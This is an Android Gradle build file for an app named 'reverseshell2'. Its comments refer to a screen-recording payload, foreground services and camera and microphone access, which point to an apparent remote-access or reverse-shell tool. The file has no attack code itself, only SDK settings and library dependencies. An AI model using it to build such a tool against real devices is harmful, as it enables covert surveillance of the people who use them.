apply plugin: 'com.android.application'

android {
    // ============================================================
    // Android 12 (API 31) required SDK levels
    // ============================================================
    compileSdkVersion 33
    buildToolsVersion "33.0.2"

    defaultConfig {
        applicationId "com.example.reverseshell2"

        // minSdk 21 is required for JobScheduler (used by functions.jobScheduler())
        minSdkVersion 21

        // targetSdk 31+ is REQUIRED for Android 12 foreground service types,
        // background camera/mic restrictions, and cleartext traffic enforcement.
        targetSdkVersion 33

        versionCode 1
        versionName "1.0"
        testInstrumentationRunner "androidx.test.runner.AndroidJUnitRunner"
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
        debug {
            minifyEnabled false
        }
    }

    // ============================================================
    // Android 12: compile options for Java 8+ (required for
    // some Android 12 APIs and libraries)
    // ============================================================
    compileOptions {
        sourceCompatibility JavaVersion.VERSION_1_8
        targetCompatibility JavaVersion.VERSION_1_8
    }

    lintOptions {
        checkReleaseBuilds false
        // Suppress Android 14+ permission warnings (safe to use on API 31+)
        disable 'NewApi'
    }

    // ============================================================
    // Android 12: dex options (prevents "too many method references")
    // ============================================================
    dexOptions {
        preDexLibraries = false
    }
}

dependencies {
    // ============================================================
    // Core AndroidX libraries (updated for Android 12)
    // ============================================================
    implementation fileTree(dir: 'libs', include: ['*.jar'])

    // AndroidX AppCompat - REQUIRED for DayNight theme, foreground service APIs
    implementation 'androidx.appcompat:appcompat:1.6.1'

    // AndroidX Core - provides ContextCompat.startForegroundService()
    implementation 'androidx.core:core:1.12.0'

    // ConstraintLayout (for controlPanel layout)
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'

    // ============================================================
    // Third-party libraries
    // ============================================================

    // Commons IO (file utilities)
    implementation group: 'commons-io', name: 'commons-io', version: '2.0.1'

    // Screenshotty (for screen capture) - NOTE: the screen recording
    // payload now uses MediaProjection API instead, so this may be
    // removable. Kept for backward compatibility.
    implementation 'eu.bolt:screenshotty:1.0.2'

    // ============================================================
    // Testing
    // ============================================================
    testImplementation 'junit:junit:4.13.2'
    androidTestImplementation 'androidx.test.ext:junit:1.1.5'
    androidTestImplementation 'androidx.test.espresso:espresso-core:3.5.1'
}
